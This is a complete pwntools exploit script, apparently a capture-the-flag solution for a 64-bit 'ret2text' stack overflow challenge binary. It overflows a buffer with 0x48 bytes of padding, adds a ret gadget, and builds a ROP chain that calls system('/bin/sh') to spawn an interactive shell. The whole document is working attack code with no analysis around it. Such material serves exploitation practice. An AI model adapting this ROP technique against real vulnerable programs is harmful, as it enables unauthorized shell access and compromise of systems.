from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("./ret2text_64")
elf = ELF("./ret2text_64")
rop = ROP(elf)

io.sendlineafter(b"age?\n", b"1000")

padding = cyclic(0x40 + 8)
bin_sh = next(elf.search(b"/bin/sh"))
ret = rop.find_gadget(["ret"])

rop.raw(padding)
rop.raw(ret)
rop.call(elf.sym["system"], [bin_sh])
payload = rop.chain()

io.sendlineafter(b"overflow!\n", payload)

io.interactive()
